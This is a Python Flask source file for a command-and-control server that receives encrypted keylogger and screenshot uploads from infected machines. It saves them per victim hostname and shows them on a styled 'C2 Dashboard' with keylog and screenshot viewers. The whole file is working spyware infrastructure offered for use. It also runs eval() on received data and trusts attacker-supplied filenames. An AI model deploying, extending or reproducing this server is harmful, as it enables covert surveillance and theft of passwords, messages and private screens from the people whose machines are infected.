from flask import Flask, request, jsonify, send_from_directory, Response
import base64
import zlib
from Crypto.Cipher import AES
import os
import datetime
import json

app = Flask(__name__)

BASE_DIR = "c2_data"
LOGS_DIR = f"{BASE_DIR}/logs"
KEYS_DIR = f"{BASE_DIR}/keys"
SHOTS_DIR = f"{BASE_DIR}/screenshots"

for d in [LOGS_DIR, KEYS_DIR, SHOTS_DIR]:
    os.makedirs(d, exist_ok=True)

KEY = b'0123456789ABCDEF0123456789ABCDEF'
IV = b'0123456789ABCDEF'

def decrypt(encrypted_b64):
    try:
        enc_bytes = base64.b64decode(encrypted_b64)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        dec_padded = cipher.decrypt(enc_bytes)
        padding_len = dec_padded[-1]
        decrypted = dec_padded[:-padding_len]
        decompressed = zlib.decompress(decrypted).decode('utf-8')
        return eval(decompressed)
    except: 
        return None

def save_payload(payload):
    session_id = payload.get("hostname", "unknown")
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Save JSON log
    log_file = f"{LOGS_DIR}/session_{session_id}_{ts}.json"
    with open(log_file, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2)
    
    # Save keylog as readable text
    if "keys" in payload and payload["keys"]:
        keys_file = f"{KEYS_DIR}/keys_{session_id}_{ts}.txt"
        with open(keys_file, "w", encoding="utf-8") as f:
            f.write(payload["keys"])
    
    # Save screenshots (FIXED - proper PNG decoding)
    if "screenshot_data" in payload:
        for shot in payload["screenshot_data"]:
            try:
                shot_fn = f"{SHOTS_DIR}/{shot['filename']}"
                img_bytes = base64.b64decode(shot['data'])
                with open(shot_fn, "wb") as f:
                    f.write(img_bytes)
                print(f"📸 Saved: {shot_fn}")
            except Exception as e:
                print(f"❌ Shot save error: {e}")
    
    print(f"[+] {session_id}: {len(payload.get('keys',''))} keys, {payload.get('screenshots',0)} shots")
    return True

@app.route("/receive", methods=["POST"])
def receive():
    data = request.json.get("data", "")
    if not data: 
        return jsonify({"error": "No data"}), 400
    
    payload = decrypt(data)
    if not payload: 
        return jsonify({"error": "Decrypt failed"}), 400
    
    save_payload(payload)
    return jsonify({"status": "ok", "keys": len(payload.get('keys','')), "shots": payload.get('screenshots',0)})

@app.route("/")
def dashboard():
    keylogs = sorted([f for f in os.listdir(KEYS_DIR) if f.endswith('.txt')], reverse=True)
    shots = sorted([f for f in os.listdir(SHOTS_DIR) if f.endswith('.png')], reverse=True)
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 C2 Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    *{{margin:0;padding:0;box-sizing:border-box}}
    body{{font-family:'Consolas','Monaco',monospace;background:linear-gradient(135deg,#000,#1a0033);color:#00ff88;min-height:100vh;padding:20px;overflow-x:hidden}}
    .container{{max-width:1400px;margin:0 auto}}
    h1{{font-size:2.5em;color:#00ff88;text-shadow:0 0 30px #00ff88;text-align:center;margin-bottom:30px;animation:pulse 2s infinite}}
    @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.7}}}}
    .stats{{display:grid;grid-template-columns:1fr 1fr;gap:30px;margin-bottom:40px}}
    .stat-card{{background:linear-gradient(145deg,#111,#222);padding:25px;border-radius:15px;border:2px solid #333;box-shadow:0 10px 30px rgba(0,255,136,0.1);text-align:center}}
    .stat-number{{font-size:3em;color:#00ff88;text-shadow:0 0 20px #00ff88;font-weight:bold}}
    .shot-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;margin:30px 0}}
    .shot-card{{background:#111;border-radius:12px;overflow:hidden;border:2px solid #333;transition:transform 0.3s,box-shadow 0.3s}}
    .shot-card:hover{{transform:translateY(-10px);box-shadow:0 20px 40px rgba(0,255,136,0.4)}}
    .shot-img{{width:100%;height:200px;object-fit:cover;display:block}}
    .shot-info{{padding:15px;background:#000;color:#00ff88}}
    .keylogs-list{{background:linear-gradient(145deg,#111,#222);padding:25px;border-radius:15px;border:2px solid #333;margin:30px 0;max-height:400px;overflow-y:auto}}
    .keylog-item{{padding:15px;margin:10px 0;background:#000;border-radius:8px;border-left:4px solid #00ff88;transition:background 0.2s}}
    .keylog-item:hover{{background:#0a0a0a}}
    a{{color:#00ff88;text-decoration:none;font-weight:bold}}a:hover{{text-decoration:underline;color:#00ccff}}
    .back-btn{{position:fixed;top:20px;right:20px;background:linear-gradient(145deg,#00ff88,#00cc66);color:#000;padding:12px 20px;border-radius:25px;font-weight:bold;box-shadow:0 5px 15px rgba(0,255,136,0.4);transition:all 0.3s}}
    .back-btn:hover{{transform:scale(1.05);box-shadow:0 8px 25px rgba(0,255,136,0.6)}}
    @media(max-width:768px){{.stats{{grid-template-columns:1fr}}.shot-grid{{grid-template-columns:1fr}}}}
    </style>
</head>
<body>
    <a href="/" class="back-btn">🏠 Dashboard</a>
    <div class="container">
        <h1>🔥 C2 Dashboard - LIVE</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{len(shots)}</div>
                <div>📸 Screenshots</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len(keylogs)}</div>
                <div>⌨️ Keylogs</div>
            </div>
        </div>
        
        <div class="shot-grid">
        {' '.join([f'''
            <div class="shot-card">
                <img src="/shots/{f}" alt="{f}" class="shot-img" loading="lazy">
                <div class="shot-info">
                    <a href="/shots/{f}" target="_blank">{f}</a>
                </div>
            </div>''' for f in shots[:12]])}
        </div>
        
        <div class="keylogs-list">
            <h3 style="margin-bottom:20px;color:#00ff88">⌨️ Latest Keylogs ({len(keylogs)})</h3>
            {' '.join([f'<div class="keylog-item"><a href="/keys/{f}" target="_blank">{f}</a></div>' for f in keylogs[:10]])}
        </div>
        
        <div style="text-align:center;margin-top:40px;color:#666;font-size:14px">
            <p>🛑 STOP: Ctrl+Alt+Q | 💥 DELETE: ESC</p>
            <p>Last update: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")}</p>
        </div>
    </div>
</body>
</html>
    """
    return html

@app.route("/keys/<path:filename>")
def serve_keys(filename):
    filepath = os.path.join(KEYS_DIR, filename)
    if not os.path.exists(filepath):
        return "❌ File not found", 404
    
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        size = os.path.getsize(filepath)
        mtime = datetime.datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
        
        # HTML escape for display
        content_html = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        content_html = content_html.replace('\n', '<br>').replace(' ', '&nbsp;').replace('\t', '&nbsp;&nbsp;&nbsp;&nbsp;')
        
        return f"""
<!DOCTYPE html>
<html><head><title>⌨️ {filename}</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:'Consolas','Monaco',monospace;background:linear-gradient(135deg,#000,#1a0033);color:#00ff88;margin:0;padding:40px;line-height:1.5;font-size:16px;min-height:100vh}}
pre{{background:#111;padding:30px;border-radius:15px;border:2px solid #333;max-height:80vh;overflow:auto;white-space:pre-wrap;word-wrap:break-word;box-shadow:0 10px 30px rgba(0,255,136,0.2)}}
.header{{background:linear-gradient(145deg,#00ff88,#00cc66);color:#000;padding:25px;border-radius:15px;margin-bottom:30px;text-align:center;box-shadow:0 10px 30px rgba(0,255,136,0.4)}}
.stats{{display:flex;justify-content:space-between;background:#111;padding:20px;border-radius:10px;margin-bottom:20px;font-size:14px}}
.back-btn{{position:fixed;top:20px;left:20px;background:linear-gradient(145deg,#00ff88,#00cc66);color:#000;padding:12px 24px;border-radius:25px;font-weight:bold;text-decoration:none;box-shadow:0 5px 15px rgba(0,255,136,0.4)}}
</style>
</head>
<body>
<a href="/" class="back-btn">🏠 Dashboard</a>
<div class="header">
    <h2>⌨️ KEYLOG VIEWER</h2>
    <div class="stats">
        <span><strong>{filename}</strong></span>
        <span>{size} bytes</span>
        <span>{mtime}</span>
    </div>
</div>
<pre>{content_html}</pre>
</body></html>
        """
    except Exception as e:
        return f"❌ Error reading file: {e}", 500

@app.route("/shots/<path:filename>")
def serve_shots(filename):
    filepath = os.path.join(SHOTS_DIR, filename)
    if os.path.exists(filepath):
        return send_from_directory(SHOTS_DIR, filename)
    return "❌ Image not found", 404

@app.route("/keys/")
@app.route("/shots/")
def list_files():
    path = request.path[1:]
    dir_path = SHOTS_DIR if path.startswith("shots") else KEYS_DIR
    files = sorted([f for f in os.listdir(dir_path) if f.endswith(('.png','.txt'))], reverse=True)
    
    items = ''.join([f'<div style="padding:15px;margin:10px 0;background:#111;border-radius:8px;border-left:4px solid #00ff88"><a href="/{path}/{f}" target="_blank">{f}</a></div>' for f in files])
    
    return f"""
<!DOCTYPE html>
<html><head><title>{path.upper()}</title>
<style>body{{font-family:Consolas;background:#000;color:#00ff88;padding:40px}}div{{margin:20px 0}}</style></head>
<body>
<h2>{len(files)} {path.upper()}</h2>
{items}
<br><a href="/" style="color:#00ff88;font-size:20px">🏠 Dashboard</a>
</body></html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🔥 C2 Server running on :{port}")
    app.run(host="0.0.0.0", port=port, debug=False)